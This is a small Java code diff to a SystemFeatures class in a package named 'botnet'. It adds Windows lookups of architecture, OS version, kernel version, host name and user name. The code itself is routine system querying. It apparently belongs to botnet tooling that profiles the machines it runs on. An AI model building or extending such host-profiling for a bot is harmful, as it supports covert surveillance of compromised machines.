@@ -29,6 +29,7 @@ package com.acmutv.botnet.core.analysis;
 import com.acmutv.botnet.core.exception.BotAnalysisException;
 import com.acmutv.botnet.tool.runtime.LinuxSysInfoTools;
 import com.acmutv.botnet.tool.runtime.MacOsxSysInfoTools;
+import com.acmutv.botnet.tool.runtime.WindowsSysInfoTools;
 
 import lombok.AllArgsConstructor;
 import lombok.Data;
@@ -113,12 +114,13 @@ public class SystemFeatures {
 			userName 	 	  = linux.getUserName();  
 		}
 		else if (osName.toUpperCase().equals("WINDOWS")){
-			osArch = ""; 
-			osVersion = "";
-			kernelVersion   = "";
+			WindowsSysInfoTools win = new WindowsSysInfoTools();
+			osArch = System.getProperty ("os.arch"); 
+			osVersion = System.getProperty ("os.version");
+			kernelVersion   = win.getKernelVersion();
 			browsers 	  	  = "";
-			hostName 	  	  = "";
-			userName 	 	  = ""; 
+			hostName 	  	  = win.getHostName();
+			userName 	 	  = win.getUserName();
 		}else{
 			osArch = "Not Found"; 
 			osVersion = "Not Found";
